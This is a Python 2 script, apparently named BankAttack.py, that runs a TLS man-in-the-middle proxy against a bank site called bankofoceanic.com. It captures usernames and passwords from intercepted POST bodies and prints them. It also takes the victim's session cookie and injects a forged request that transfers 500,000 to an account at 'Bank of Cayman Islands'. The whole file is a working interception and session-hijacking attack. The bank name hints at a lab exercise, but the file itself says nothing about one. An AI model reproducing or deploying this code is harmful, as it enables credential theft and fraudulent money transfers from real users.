import BaseHTTPServer
import cgi, zlib, StringIO, cStringIO
import os, sys, thread, socket, ssl, struct
from PIL import Image

MAX_DATA_RECV = 100*4096

#**************************************
#********* MAIN PROGRAM ***************
#**************************************

def main():
	if (len(sys.argv)<3):
		sys.exit('Usage: %s <server IP> <server port> \n example: python BankAttack.py 192.168.72.129 8443\n' % os.path.basename(__file__))
	host = sys.argv[1]
	port = int(sys.argv[2])
	httpd = BaseHTTPServer.HTTPServer((host, port), MyHttpTCPHandler)
	httpd.socket = ssl.wrap_socket (httpd.socket, certfile='server_oceanic.pem', server_side=True)
	httpd.serve_forever()
 

class MyHttpTCPHandler(BaseHTTPServer.BaseHTTPRequestHandler):

    def do_GET(self):
	message_parts = []
	postdata=''
	for name, value in sorted(self.headers.items()):
            message_parts.append('%s: %s' % (name, value.rstrip()))
        message_parts.append('')
        request = '\r\n'.join(message_parts)
    	request = 'GET '+ self.path + ' HTTP/1.1\r\n' + request + '\r\n'
	hostname_pos = request.find('host:')
	hostname = request[hostname_pos:]
	hostname = hostname[hostname.find(':')+1:hostname.find('\n')].strip()
	first_line = request.split('\n')[0]
	url = first_line.split(' ')[1]
	http_pos = url.find("://")
	if (http_pos==-1):
		temp = url
	else:
		temp = url[(http_pos + 3):]
	port_pos = temp.find(":")
	webserver_pos = temp.find("/")
	if webserver_pos == -1:
		webserver_pos = len(temp)
	port = -1
	if (port_pos==-1 or webserver_pos < port_pos):
		port = 443
	else:
		port = int((temp[(port_pos + 1):])[:webserver_pos - port_pos - 1])
	webserver = hostname
	print "Connecting to: " + webserver + ':' + str(port)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
		s = ssl.wrap_socket(s)
		s.connect((webserver, port))
		request = request.replace('accept-encoding: gzip, deflate, br\r\n','')
		request = request.replace('accept-encoding: gzip, deflate\r\n','')
		s.send(request + postdata)
		while 1:
			try:
				data = s.recv(MAX_DATA_RECV)	
			except:
				data = ''
			if len(data)==0:
				break
			self.request.send(data)
			self.request.close()
		s.close()
	except Exception as e:
		print(e)
		if s:
			s.close()
	if s:
		s.close()
	self.request.close()

    def do_POST(self):
 	postdata = self.rfile.read(int(self.headers.get('Content-Length', '0')))
	message_parts = []
	for name, value in sorted(self.headers.items()):
            message_parts.append('%s: %s' % (name, value.rstrip()))
        message_parts.append('')
        request = '\r\n'.join(message_parts)
    	request = 'POST '+ self.path + ' HTTP/1.1\r\n' + request + '\r\n' + postdata
	request = request.replace('accept-encoding: gzip, deflate, br\r\n','')
	request = request.replace('accept-encoding: gzip, deflate\r\n','')
	cookie = request[request.find('cookie:'):]
	cookie = cookie[:cookie.find('\r\n')]
	hostname_pos = request.find('host:')
	hostname = request[hostname_pos:]
	hostname = hostname[hostname.find(':')+1:hostname.find('\n')].strip()
	log = postdata
	userpass_location =  log.lower().find('username=')
	if  userpass_location > -1:
		log = log[userpass_location+1:]
		tokens = log.split('&')
		user = tokens[0][tokens[0].find('=') + 1:]
		passw = tokens[1][tokens[1].find('=') + 1:]
		userpass = 'Account at ' + hostname + '. username: ' + user + ', password: ' + passw
		print userpass
	first_line = request.split('\n')[0]
	url = first_line.split(' ')[1]
	http_pos = url.find("://")
	if (http_pos==-1):
		temp = url
	else:
		temp = url[(http_pos + 3):]
	port_pos = temp.find(":")
	webserver_pos = temp.find("/")
	if webserver_pos == -1:
		webserver_pos = len(temp)
	port = -1
	if (port_pos==-1 or webserver_pos < port_pos):
		port = 443
	else:
		port = int((temp[(port_pos+1):])[:webserver_pos-port_pos-1])
	webserver = hostname
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
		s = ssl.wrap_socket(s)
		s.connect((webserver, port))
		s.send(request)
		while 1:
			try:
				raw_data = s.recv(MAX_DATA_RECV)
				data=zlib.decompress(raw_data, 16+zlib.MAX_WBITS)
			except:
				data=raw_data
			if len(data)==0:
				break
			if data.find('Location: securedpage.php') > -1:			  
				attack_data = "POST /accounts/securitycheck.php HTTP/1.1\r\nHost: bankofoceanic.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:8.0.1) Gecko/20100101 Firefox/8.0.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nConnection: keep-alive\r\nReferer: https://bankofoceanic.com/accounts/transfer.php\r\nCookie:\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 90\r\n\r\nacc_owner=white+rabit&acc_bank=Bank+of+Cayman+Islands&acc_num=4332+5664+3322&amount=500000"
				attack_data = attack_data.replace('Cookie:',cookie)
				s.send(attack_data)
				data = s.recv(MAX_DATA_RECV)
			self.request.send(data)
			self.request.close()
		s.close()
	except socket.error:
		if s:
			s.close()
	if s:
		s.close()
	self.finish()
	self.request.close()

#********** END PROXY_THREAD ***********
    
if __name__ == '__main__':
    main()
